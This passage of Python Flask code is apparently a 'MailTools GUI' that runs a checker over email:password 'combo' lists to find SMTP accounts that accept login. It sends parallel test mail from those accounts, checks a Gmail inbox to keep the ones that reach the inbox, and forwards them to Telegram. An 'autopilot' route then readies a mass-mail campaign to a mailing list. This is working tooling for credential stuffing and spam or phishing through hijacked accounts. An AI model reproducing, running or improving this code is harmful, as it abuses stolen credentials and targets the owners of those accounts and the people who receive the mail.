            )
        if 'imap' in msg.lower() or 'disabled' in msg.lower():
            raise Exception(
                'Gmail IMAP is disabled. Go to Gmail Settings → See all settings → Forwarding and POP/IMAP → Enable IMAP.'
            )
        raise Exception(f'Gmail login failed: {msg}')

    # Only look at emails arrived since (now - since_minutes), using IMAP SINCE criterion.
    # IMAP SINCE is date-only (no time), so we go back 1 extra day to be safe on day boundaries.
    since_dt   = datetime.now(timezone.utc) - timedelta(minutes=since_minutes + 1440)
    since_str  = since_dt.strftime('%d-%b-%Y')   # e.g. "03-May-2026"

    def folder_senders(folder):
        found = []
        try:
            rv, _ = mail.select(folder, readonly=True)
            if rv != 'OK': return found
            # Use SUBJECT + SINCE to narrow the search on the server side
            search_q = f'(SINCE "{since_str}" SUBJECT "{subject_kw}")'
            _, nums  = mail.search(None, search_q)
            ids = nums[0].split() if nums[0] else []
            for n in ids:
                _, data = mail.fetch(n, '(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])')
                if not data or not data[0]: continue
                raw = data[0][1] if isinstance(data[0], tuple) else b''
                msg = emaillib.message_from_bytes(raw)
                # decode subject and verify it contains our unique tag
                raw_subj = msg.get('Subject', '')
                try:
                    parts = emaillib.header.decode_header(raw_subj)
                    subj  = ''.join(
                        p.decode(enc or 'utf-8') if isinstance(p, bytes) else p
                        for p, enc in parts
                    )
                except:
                    subj = str(raw_subj)
                if subject_kw.lower() not in subj.lower(): continue
                frm = msg.get('From', '')
                m = re.search(r'[\w.+\-]+@[\w.\-]+\.[a-zA-Z]{2,}', frm)
                if m: found.append(m.group(0).lower())
        except Exception as e:
            logger.debug(f'Gmail folder {folder}: {e}')
        return found

    inbox = folder_senders('INBOX')
    spam  = folder_senders('[Gmail]/Spam')
    try: mail.logout()
    except: pass
    return {'inbox': inbox, 'spam': spam}

def _send_batch_parallel(smtps, to_email, subject, body, max_workers=20, stop_ev=None):
    """Yield (index, user, ok, err) as parallel sends complete. 20x faster than sequential."""
    ex = ThreadPoolExecutor(max_workers=min(max_workers, max(1, len(smtps))))
    try:
        fut_map = {ex.submit(_send_one_test, s, to_email, subject, body): (i, s)
                   for i, s in enumerate(smtps)}
        for fut in as_completed(fut_map):
            if stop_ev and stop_ev.is_set(): break
            i, s = fut_map[fut]
            try:   ok, err = fut.result()
            except Exception as e: ok, err = False, str(e)[:120]
            yield i, s['user'], ok, err
    except GeneratorExit:
        pass
    finally:
        ex.shutdown(wait=False, cancel_futures=True)

@app.route('/api/deliverability/test-gmail', methods=['POST'])
def deliverability_test_gmail():
    d     = request.json or {}
    user  = d.get('gmail_user', '').strip()
    pwd   = d.get('gmail_pass', '').strip()
    if not user or not pwd:
        return jsonify({'error': 'Gmail address and app password are required'}), 400
    try:
        _gmail_check(user, pwd, 'mailtools_test_xyz', since_minutes=1)
        return jsonify({'ok': True, 'msg': f'Connected as {user}'})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/deliverability/run', methods=['POST'])
def deliverability_run():
    d                = request.json or {}
    smtp_file        = d.get('smtp_file', '')
    to_email         = d.get('to_email', '')
    original_subject = d.get('subject', 'Test').strip() or 'Test'
    subject          = original_subject   # will be tagged below
    body             = d.get('body', '<p>Test</p>')
    gmail_user = d.get('gmail_user', '').strip()
    gmail_pass = d.get('gmail_pass', '').strip()
    wait_secs  = max(20, min(300, int(d.get('wait_secs', 60))))
    max_smtps  = max(1,  min(200, int(d.get('max_smtps', 50))))

    if not os.path.isfile(smtp_file):
        return jsonify({'error': 'SMTP file not found — upload it first'}), 400
    if not to_email or not gmail_user or not gmail_pass:
        return jsonify({'error': 'Gmail email, address, and app password are required'}), 400

    test_id = uuid.uuid4().hex[:8]
    run_tag = uuid.uuid4().hex[:6]
    subject = f'{subject} [{run_tag}]'
    stop_ev = threading.Event()
    with _deliv_lock: _stop_events[test_id] = stop_ev

    def gen():
        try:
            yield f'data: {json.dumps({"type":"started","test_id":test_id})}\n\n'
            smtps = []
            try:
                with open(smtp_file, 'r', encoding='utf-8', errors='replace') as f:
                    for line in f:
                        s = _parse_smtp_line(line)
                        if s: smtps.append(s)
                        if len(smtps) >= max_smtps: break
            except Exception as e:
                yield f'data: {json.dumps({"type":"error","text":str(e)})}\n\n'; return

            yield f'data: {json.dumps({"type":"status","text":f"Sending from {len(smtps)} SMTPs in parallel… (tag: {run_tag})"})}\n\n'

            sent, failed, done = [], [], 0
            for _, user, ok, err in _send_batch_parallel(smtps, to_email, subject, body,
                                                         max_workers=min(30, len(smtps)),
                                                         stop_ev=stop_ev):
                if stop_ev.is_set(): break
                done += 1
                ev_d = {'type':'progress','i':done,'total':len(smtps),'user':user,'ok':ok}
                if not ok: ev_d['err'] = err[:80]
                yield f'data: {json.dumps(ev_d)}\n\n'
                if ok: sent.append(user)
                else:  failed.append({'user': user, 'err': err})

            if stop_ev.is_set():
                yield f'data: {json.dumps({"type":"error","text":"Stopped by user"})}\n\n'; return

            yield f'data: {json.dumps({"type":"waiting","sent":len(sent),"secs":wait_secs})}\n\n'
            for i in range(wait_secs):
                if stop_ev.is_set(): break
                time.sleep(1)
                if i % 5 == 0 or i == wait_secs - 1:
                    yield f'data: {json.dumps({"type":"countdown","remaining":wait_secs-i})}\n\n'

            if stop_ev.is_set():
                yield f'data: {json.dumps({"type":"error","text":"Stopped by user"})}\n\n'; return

            yield f'data: {json.dumps({"type":"status","text":"Connecting to Gmail…"})}\n\n'
            try:
                gr      = _gmail_check(gmail_user, gmail_pass, subject, since_minutes=wait_secs//60+10)
                inbox_s = set(gr['inbox']); spam_s = set(gr['spam'])
                results = []
                for u in sent:
                    ul = u.lower()
                    st = 'inbox' if ul in inbox_s else ('spam' if ul in spam_s else 'missing')
                    results.append({'user': u, 'status': st})
                for f2 in failed:
                    results.append({'user': f2['user'], 'status': 'failed', 'err': f2['err']})
                with _deliv_lock:
                    _deliv_store[test_id] = {'results': results, 'smtp_file': smtp_file,
                                              'subject': subject, 'body': body,
                                              'original_subject': original_subject, '_ts': time.time()}
                inbox_n = sum(1 for r in results if r['status'] == 'inbox')
                spam_n  = sum(1 for r in results if r['status'] == 'spam')
                miss_n  = sum(1 for r in results if r['status'] == 'missing')
                yield f'data: {json.dumps({"type":"done","test_id":test_id,"results":results,"inbox":inbox_n,"spam":spam_n,"missing":miss_n})}\n\n'
            except Exception as e:
                yield f'data: {json.dumps({"type":"error","text":str(e)})}\n\n'
        except GeneratorExit:
            pass
        finally:
            with _deliv_lock: _stop_events.pop(test_id, None)

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/deliverability/loop', methods=['POST'])
def deliverability_loop():
    d                = request.json or {}
    smtp_file        = d.get('smtp_file', '')
    to_email         = d.get('to_email', '')
    original_subject = d.get('subject', 'Test').strip() or 'Test'
    subject          = original_subject   # will be tagged below
    body             = d.get('body', '<p>Test</p>')
    gmail_user = d.get('gmail_user', '').strip()
    gmail_pass = d.get('gmail_pass', '').strip()
    wait_secs  = max(20, min(300, int(d.get('wait_secs', 60))))
    batch_size = max(1,  min(200, int(d.get('batch_size', 20))))

    if not os.path.isfile(smtp_file):
        return jsonify({'error': 'SMTP file not found — upload it first'}), 400
    if not to_email or not gmail_user or not gmail_pass:
        return jsonify({'error': 'Gmail email, address, and app password are required'}), 400

    test_id = uuid.uuid4().hex[:8]
    run_tag = uuid.uuid4().hex[:6]
    subject = f'{subject} [{run_tag}]'
    stop_ev = threading.Event()
    with _deliv_lock: _stop_events[test_id] = stop_ev

    def gen():
        try:
            yield f'data: {json.dumps({"type":"started","test_id":test_id})}\n\n'
            all_smtps = []; raw_lines = {}
            try:
                with open(smtp_file, 'r', encoding='utf-8', errors='replace') as f:
                    for line in f:
                        s = _parse_smtp_line(line)
                        if s: all_smtps.append(s); raw_lines[s['user'].lower()] = line.rstrip()
            except Exception as e:
                yield f'data: {json.dumps({"type":"error","text":str(e)})}\n\n'; return
            if not all_smtps:
                yield f'data: {json.dumps({"type":"error","text":"No valid SMTPs found"})}\n\n'; return

            batches = [all_smtps[i:i+batch_size] for i in range(0, len(all_smtps), batch_size)]
            total_batches = len(batches)
            yield f'data: {json.dumps({"type":"loop_start","total_smtps":len(all_smtps),"total_batches":total_batches,"batch_size":batch_size})}\n\n'

            all_results = []; inbox_lines = []

            for bi, batch in enumerate(batches):
                if stop_ev.is_set(): break
                yield f'data: {json.dumps({"type":"batch_start","batch":bi+1,"total":total_batches,"batch_smtps":len(batch)})}\n\n'

                sent, failed, done = [], [], 0
                for _, user, ok, err in _send_batch_parallel(batch, to_email, subject, body,
                                                             max_workers=min(30, len(batch)),
                                                             stop_ev=stop_ev):
                    if stop_ev.is_set(): break
                    done += 1
                    ev_d = {'type':'progress','i':done,'total':len(batch),'user':user,'ok':ok,
                            'batch':bi+1,'batch_total':total_batches}
                    if not ok: ev_d['err'] = err[:80]
                    yield f'data: {json.dumps(ev_d)}\n\n'
                    if ok: sent.append(user)
                    else:  failed.append({'user': user, 'err': err})

                if stop_ev.is_set(): break

                yield f'data: {json.dumps({"type":"waiting","sent":len(sent),"secs":wait_secs,"batch":bi+1,"total":total_batches})}\n\n'
                for i in range(wait_secs):
                    if stop_ev.is_set(): break
                    time.sleep(1)
                    if i % 5 == 0 or i == wait_secs - 1:
                        yield f'data: {json.dumps({"type":"countdown","remaining":wait_secs-i,"batch":bi+1,"total":total_batches})}\n\n'

                if stop_ev.is_set(): break
                yield f'data: {json.dumps({"type":"status","text":f"Batch {bi+1}/{total_batches}: Checking Gmail…"})}\n\n'

                try:
                    gr = _gmail_check(gmail_user, gmail_pass, subject, since_minutes=wait_secs//60+10)
                    inbox_s = set(gr['inbox']); spam_s = set(gr['spam'])
                    batch_results = []
                    for u in sent:
                        ul = u.lower()
                        st = 'inbox' if ul in inbox_s else ('spam' if ul in spam_s else 'missing')
                        batch_results.append({'user': u, 'status': st})
                        if st == 'inbox' and ul in raw_lines: inbox_lines.append(raw_lines[ul])
                    for f2 in failed:
                        batch_results.append({'user': f2['user'], 'status': 'failed', 'err': f2['err']})
                    all_results.extend(batch_results)
                    b_inbox = sum(1 for r in batch_results if r['status'] == 'inbox')
                    b_spam  = sum(1 for r in batch_results if r['status'] == 'spam')
                    t_inbox = sum(1 for r in all_results   if r['status'] == 'inbox')
                    yield f'data: {json.dumps({"type":"batch_done","batch":bi+1,"total":total_batches,"batch_results":batch_results,"batch_inbox":b_inbox,"batch_spam":b_spam,"total_inbox":t_inbox,"total_tested":len(all_results)})}\n\n'
                except Exception as e:
                    yield f'data: {json.dumps({"type":"error","text":f"Batch {bi+1} Gmail check failed: {e}"})}\n\n'

            with _deliv_lock:
                _deliv_store[test_id] = {'results': all_results, 'smtp_file': smtp_file,
                                          'subject': subject, 'body': body,
                                          'inbox_lines': inbox_lines,
                                          'original_subject': original_subject, '_ts': time.time()}
            t_inbox = sum(1 for r in all_results if r['status'] == 'inbox')
            t_spam  = sum(1 for r in all_results if r['status'] == 'spam')
            t_miss  = sum(1 for r in all_results if r['status'] == 'missing')
            yield f'data: {json.dumps({"type":"loop_done","test_id":test_id,"results":all_results,"inbox":t_inbox,"spam":t_spam,"missing":t_miss,"total":len(all_results)})}\n\n'
        except GeneratorExit:
            pass
        finally:
            with _deliv_lock: _stop_events.pop(test_id, None)

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/deliverability/save-good', methods=['POST'])
def deliverability_save_good():
    d       = request.json or {}
    test_id = d.get('test_id', '')
    data    = _deliv_store.get(test_id)
    if not data: return jsonify({'error': 'Test results not found (re-run test)'}), 404

    # Loop mode stores inbox_lines directly — use them if present
    if 'inbox_lines' in data:
        good_lines = data['inbox_lines']
        if not good_lines: return jsonify({'error': 'No inbox-delivering SMTPs found'}), 400
    else:
        good_users = {r['user'].lower() for r in data['results'] if r['status'] == 'inbox'}
        if not good_users: return jsonify({'error': 'No inbox-delivering SMTPs found'}), 400
        good_lines = []
        try:
            with open(data['smtp_file'], 'r', encoding='utf-8', errors='replace') as f:
                for line in f:
                    s = _parse_smtp_line(line)
                    if s and s['user'].lower() in good_users:
                        good_lines.append(line.rstrip())
        except Exception as e:
            return jsonify({'error': str(e)}), 500

    label = d.get('label', '').strip()
    out   = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}_inbox_smtps.txt')
    with open(out, 'w', encoding='utf-8') as f: f.write('\n'.join(good_lines) + '\n')
    _record_path('uploads', out, f'inbox_smtps_{len(good_lines)}.txt', len(good_lines))
    _add_to_inbox_lib(out, len(good_lines), label or f'inbox_{len(good_lines)}_{time.strftime("%m%d_%H%M")}')
    logger.info(f'Saved {len(good_lines)} inbox SMTPs → {out}')
    _tg_send_file(out, f'📥 {len(good_lines)} Inbox SMTPs saved (deliverability test)')
    return jsonify({
        'path':             out,
        'count':            len(good_lines),
        'name':             os.path.basename(out),
        'original_subject': data.get('original_subject', ''),
        'body':             data.get('body', ''),
    })

@app.route('/api/deliverability/stop/<test_id>', methods=['POST'])
def deliverability_stop(test_id):
    ev = _stop_events.get(test_id)
    if ev:
        ev.set()
        logger.info(f'Deliverability {test_id} stopped by user')
        return jsonify({'ok': True})
    return jsonify({'ok': False, 'msg': 'No active test'})

@app.route('/api/inbox-lib', methods=['GET'])
def inbox_lib_get():
    entries = [e for e in _load_inbox_lib() if os.path.isfile(e.get('path', ''))]
    return jsonify({'entries': entries})

@app.route('/api/inbox-lib/delete', methods=['POST'])
def inbox_lib_delete():
    path    = (request.json or {}).get('path', '')
    entries = [e for e in _load_inbox_lib() if e.get('path') != path]
    _save_inbox_lib(entries)
    return jsonify({'ok': True})

@app.route('/api/health')
def health():
    return jsonify({'status': 'ok', 'version': '4.0',
                    'procs': len(processes), 'uptime': round(time.time()-SERVER_START, 1)})

@app.route('/api/autopilot/run', methods=['POST'])
def autopilot_run():
    d          = request.json or {}
    combo_file = d.get('combo_file', '')
    mail_list  = d.get('mail_list', '')
    subject    = d.get('subject', 'Hello').strip() or 'Hello'
    body       = d.get('body', '<p>Hello</p>')
    test_email = d.get('test_email', '').strip()
    smtp_file_override = d.get('smtp_file', '').strip()  # skip stage 1 if provided
    gmail_user = d.get('gmail_user', '').strip()
    gmail_pass = d.get('gmail_pass', '').strip()
    wait_secs  = max(20, min(300, int(d.get('wait_secs', 60))))
    batch_size = max(1,  min(200, int(d.get('batch_size', 20))))

    if not smtp_file_override and not os.path.isfile(combo_file):
        return jsonify({'error': 'Combo file not found — upload it first'}), 400
    if not test_email or not gmail_user or not gmail_pass:
        return jsonify({'error': 'Test email, Gmail address and app password are required'}), 400

    def ev(t, **kw): return f'data: {json.dumps({"type": t, **kw})}\n\n'

    def gen():
        ap_proc  = None
        ap_pid_k = None
        try:
            # ── Stage 1: SMTP Checker (or skip if existing file provided) ────────
            if smtp_file_override and os.path.isfile(smtp_file_override):
                smtp_out    = smtp_file_override
                with open(smtp_out, encoding='utf-8', errors='replace') as _f:
                    valid_lines = [l.strip() for l in _f if l.strip()]
                yield ev('stage_start', stage='smtp_check', msg=f'⚡ Stage 1 skipped — using {os.path.basename(smtp_out)} ({len(valid_lines)} SMTPs)')
                yield ev('smtp_done', count=len(valid_lines), file=smtp_out, name=os.path.basename(smtp_out), skipped=True)
            else:
                smtp_out = re.sub(r'\.([^.]+)$', r'_smtp.\1', combo_file)
                script   = os.path.join(BASE_DIR, 'smtp-checker', 'mailpass2smtp.py')
                if not os.path.isfile(script):
                    yield ev('error', text=f'SMTP checker script not found: {script}'); return
                yield ev('stage_start', stage='smtp_check',
                         msg=f'Running SMTP checker on {os.path.basename(combo_file)}…')
                cmd = [sys.executable, '-u', script, combo_file]
                if _cfg.get('smtp_checker_rage', True): cmd.append('rage')
                env = os.environ.copy(); env['PYTHONUNBUFFERED'] = '1'
                kw2 = dict(stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, env=env, bufsize=0)
                if sys.platform == 'win32': kw2['creationflags'] = subprocess.CREATE_NO_WINDOW
                ap_proc  = subprocess.Popen(cmd, **kw2)
                ap_pid_k = uuid.uuid4().hex[:8]
                processes[ap_pid_k] = ap_proc
                yield ev('smtp_check_pid', pid=ap_pid_k)

                def _pump():
                    while ap_proc.poll() is None:
                        try: ap_proc.stdin.write(b'\n'); ap_proc.stdin.flush()
                        except: break
                        time.sleep(3)
                threading.Thread(target=_pump, daemon=True).start()

                goods_n = 0
                for raw in iter(ap_proc.stdout.readline, b''):
                    text  = raw.decode('utf-8', errors='replace').rstrip('\r\n')
                    plain = _strip(text)
                    if '\x07' in text:
                        goods_n += 1
                        yield ev('smtp_good', count=goods_n,
                                 line=_GOOD_SMTP_RE.sub(lambda m: m.group(1)+':'+m.group(2), plain))
                    else:
                        m2 = _parse_metrics(plain)
                        if m2:  yield ev('smtp_metrics', **m2)
                        elif plain and not any(x in plain for x in ['progress:', 'speed:', '♥', 'goods/']):
                            yield ev('smtp_line', text=plain[:200])
                ap_proc.wait()
                processes.pop(ap_pid_k, None); ap_pid_k = None

                if not os.path.isfile(smtp_out) or os.path.getsize(smtp_out) == 0:
                    yield ev('error', text='SMTP checker found no valid SMTPs'); return
                with open(smtp_out, encoding='utf-8', errors='replace') as _f:
                    valid_lines = [l.strip() for l in _f if l.strip()]
                _record_path('uploads', smtp_out, f'auto_{len(valid_lines)}_smtps.txt', len(valid_lines))
                yield ev('smtp_done', count=len(valid_lines), file=smtp_out, name=os.path.basename(smtp_out))

            # ── Stage 2: Deliverability loop (parallel sends) ────────────────────
            smtps = [_parse_smtp_line(l) for l in valid_lines]
            smtps = [s for s in smtps if s]
            if not smtps:
                yield ev('error', text='No parseable SMTP lines'); return

            original_subject = subject
            run_tag          = uuid.uuid4().hex[:6]
            tagged_subject   = f'{subject} [{run_tag}]'
            test_id          = uuid.uuid4().hex[:8]
            raw_lines_map    = {s['user'].lower(): l for s, l in zip(smtps, valid_lines)}

            yield ev('stage_start', stage='deliverability',
                     msg=f'Deliverability: {len(smtps)} SMTPs × {batch_size}/batch (parallel)…')

            batches = [smtps[i:i+batch_size] for i in range(0, len(smtps), batch_size)]
            all_results = []; inbox_lines = []

            for bi, batch in enumerate(batches):
                yield ev('batch_start', batch=bi+1, total=len(batches), size=len(batch))
                sent, failed, done = [], [], 0
                for _, user, ok, err in _send_batch_parallel(batch, test_email, tagged_subject, body,
                                                             max_workers=min(30, len(batch))):
                    done += 1
                    yield ev('progress', i=done, total=len(batch), user=user, ok=ok,
                             batch=bi+1, batch_total=len(batches))
                    if ok: sent.append(user)
                    else:  failed.append({'user': user, 'err': err})

                yield ev('batch_waiting', batch=bi+1, total=len(batches), sent=len(sent), secs=wait_secs)
                for i in range(wait_secs):
                    time.sleep(1)
                    if i % 5 == 0 or i == wait_secs - 1:
                        yield ev('countdown', remaining=wait_secs-i, batch=bi+1, total=len(batches))

                try:
                    gr = _gmail_check(gmail_user, gmail_pass, tagged_subject, since_minutes=wait_secs//60+10)
                    inbox_s = set(gr['inbox']); spam_s = set(gr['spam'])
                    batch_r = []
                    for u in sent:
                        ul = u.lower()
                        st = 'inbox' if ul in inbox_s else ('spam' if ul in spam_s else 'missing')
                        batch_r.append({'user': u, 'status': st})
                        if st == 'inbox' and ul in raw_lines_map: inbox_lines.append(raw_lines_map[ul])
                    for f2 in failed:
                        batch_r.append({'user': f2['user'], 'status': 'failed', 'err': f2['err']})
                    all_results.extend(batch_r)
                    b_inbox = sum(1 for r in batch_r if r['status'] == 'inbox')
                    t_inbox = sum(1 for r in all_results if r['status'] == 'inbox')
                    yield ev('batch_done', batch=bi+1, total=len(batches),
                             batch_inbox=b_inbox, total_inbox=t_inbox, total_tested=len(all_results))
                except Exception as e:
                    yield ev('error', text=f'Batch {bi+1} Gmail check failed: {e}')

            inbox_file = ''
            if inbox_lines:
                inbox_file = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}_inbox_smtps.txt')
                with open(inbox_file, 'w', encoding='utf-8') as f: f.write('\n'.join(inbox_lines)+'\n')
                lbl = f'autopilot_{len(inbox_lines)}_{time.strftime("%m%d_%H%M")}'
                _record_path('uploads', inbox_file, f'inbox_smtps_{len(inbox_lines)}.txt', len(inbox_lines))
                _add_to_inbox_lib(inbox_file, len(inbox_lines), lbl)
                logger.info(f'Autopilot: saved {len(inbox_lines)} inbox SMTPs → {inbox_file}')
                _tg_send_file(inbox_file, f'⚡ Autopilot: {len(inbox_lines)} Inbox SMTPs ready')

            with _deliv_lock:
                _deliv_store[test_id] = {'results': all_results, 'smtp_file': smtp_out,
                                          'subject': tagged_subject, 'body': body,
                                          'inbox_lines': inbox_lines,
                                          'original_subject': original_subject, '_ts': time.time()}
            t_inbox = sum(1 for r in all_results if r['status'] == 'inbox')
            t_spam  = sum(1 for r in all_results if r['status'] == 'spam')
            yield ev('deliv_done', inbox=t_inbox, spam=t_spam, total=len(all_results),
                     inbox_file=inbox_file,
                     inbox_name=os.path.basename(inbox_file) if inbox_file else '',
                     test_id=test_id)

            if not inbox_lines:
                yield ev('error', text='No inbox-delivering SMTPs — cannot launch campaign'); return

            # ── Stage 3: Launch mailer ────────────────────────────────────────────
            yield ev('ready_to_mail',
                     smtp_file=inbox_file, smtp_name=os.path.basename(inbox_file),
                     smtp_count=len(inbox_lines), original_subject=original_subject,
                     body=body, mail_list=mail_list, test_id=test_id)

        except GeneratorExit:
            pass
        finally:
            if ap_proc and ap_proc.poll() is None:
                try: ap_proc.terminate()
                except: pass
            if ap_pid_k: processes.pop(ap_pid_k, None)

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/telegram/config')
def tg_config_get():
    return jsonify({
        'token_set': bool(_cfg.get('telegram_token', '').strip()),
        'chat_id':   _cfg.get('telegram_chat_id', ''),
        'on_good':   _cfg.get('telegram_on_good', True),
        'on_done':   _cfg.get('telegram_on_done', True),
    })

@app.route('/api/telegram/save', methods=['POST'])
def tg_config_save():
    d = request.json or {}
    tok = d.get('token', '').strip()
    if tok: _cfg['telegram_token'] = tok          # blank = keep existing
    _cfg['telegram_chat_id']  = d.get('chat_id', _cfg.get('telegram_chat_id', '')).strip()
    _cfg['telegram_on_good']  = bool(d.get('on_good', True))
    _cfg['telegram_on_done']  = bool(d.get('on_done', True))
    try:
        with open(_cfg_path, 'w') as f: json.dump(_cfg, f, indent=2)
        logger.info('Telegram config saved')
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/telegram/test', methods=['POST'])
def tg_test():
    if not _cfg.get('telegram_token', '').strip():
        return jsonify({'error': 'Bot token not set — save settings first'}), 400
    if not _cfg.get('telegram_chat_id', '').strip():
        return jsonify({'error': 'Chat ID not set — save settings first'}), 400
    try:
        import urllib.request as _ur
        data = json.dumps({
            'chat_id': _cfg['telegram_chat_id'],
            'text': '🔔 <b>MailTools GUI</b> — test message\n✅ Telegram notifications are working!',
            'parse_mode': 'HTML'
        }).encode()
        req = _ur.Request(
            f'https://api.telegram.org/bot{_cfg["telegram_token"]}/sendMessage',
            data=data, headers={'Content-Type': 'application/json'})
        resp = _ur.urlopen(req, timeout=10).read()
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs')
def api_logs():
    n = min(int(request.args.get('n', 300)), 2000)
    lines = []
    try:
        with open(_log_file, 'r', encoding='utf-8', errors='replace') as f:
            lines = f.readlines()[-n:]
    except: pass
    return jsonify({'lines': [l.rstrip() for l in lines], 'file': _log_file})

if __name__ == '__main__':
    import webbrowser, threading as _th
    ip = get_server_ip()
    sep = '-' * 44
    print(f'\n  MailTools Web GUI  v4.0')
    print(f'  {sep}')
    print(f'  Local    :  http://127.0.0.1:{PORT}')
    print(f'  Network  :  http://{ip}:{PORT}')
    print(f'  Logs     :  {_log_file}')
    print(f'  Uploads  :  {UPLOAD_DIR}')
    print(f'  {sep}')
    print(f'  Press Ctrl+C to stop\n')
    logger.info(f'MailTools GUI v4.0 started — http://{ip}:{PORT}')
    _th.Timer(1.2, webbrowser.open, args=(f'http://127.0.0.1:{PORT}',)).start()
    app.run(host=HOST, port=PORT, debug=False, threaded=True)
